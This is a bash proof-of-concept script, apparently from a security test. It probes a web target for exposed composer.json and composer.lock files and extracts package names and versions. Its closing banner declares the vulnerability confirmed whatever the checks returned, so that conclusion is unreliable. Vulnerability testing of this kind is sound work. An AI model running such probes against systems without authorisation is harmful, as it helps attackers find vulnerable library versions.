#!/bin/bash

# POC: Information Disclosure - Exposed composer.json and composer.lock
# This script demonstrates the vulnerability of publicly accessible composer files
# containing sensitive dependency and version information

TARGET_URL="${1:-http://localhost:8081}"

echo "========================================"
echo "Composer Files Information Disclosure PoC"
echo "========================================"
echo "Target: $TARGET_URL"
echo ""

# Test 1: Check composer.json accessibility
echo "[*] Testing composer.json accessibility..."
RESPONSE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/composer.json")
echo "    HTTP Status Code: $RESPONSE_CODE"

if [ "$RESPONSE_CODE" = "200" ]; then
    echo "    [+] composer.json is accessible!"
    echo ""
    echo "[*] composer.json content:"
    curl -s "$TARGET_URL/composer.json" | head -20
    echo ""
else
    echo "    [-] composer.json returned status $RESPONSE_CODE (not accessible)"
fi

echo ""

# Test 2: Check composer.lock accessibility
echo "[*] Testing composer.lock accessibility..."
RESPONSE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/composer.lock")
echo "    HTTP Status Code: $RESPONSE_CODE"

if [ "$RESPONSE_CODE" = "200" ]; then
    echo "    [+] composer.lock is accessible!"
    echo ""
    echo "[*] Extracted dependency information from composer.lock:"
    curl -s "$TARGET_URL/composer.lock" | grep -A 1 '"name"' | head -30
    echo ""
    
    # Extract and display package versions
    echo "[*] Package versions found:"
    curl -s "$TARGET_URL/composer.lock" | grep '"version"' | head -10
    echo ""
else
    echo "    [-] composer.lock returned status $RESPONSE_CODE (not accessible)"
fi

echo "========================================"
echo "Vulnerability Confirmed:"
echo "- Both composer.json and composer.lock are world-readable"
echo "- Sensitive dependency information is exposed"
echo "- Attackers can identify vulnerable library versions"
echo "========================================"